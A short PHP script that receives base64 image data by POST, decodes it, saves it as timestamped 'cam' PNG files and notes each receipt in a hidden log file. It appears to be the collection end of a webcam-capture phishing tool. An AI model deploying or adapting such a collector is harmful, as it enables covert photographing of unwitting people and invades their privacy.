<?php
$date = date('dMYHis');
$imageData=$_POST['cat'];
if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, ".log.log");
}
$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'cam'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose( $fp );
exit();
?>
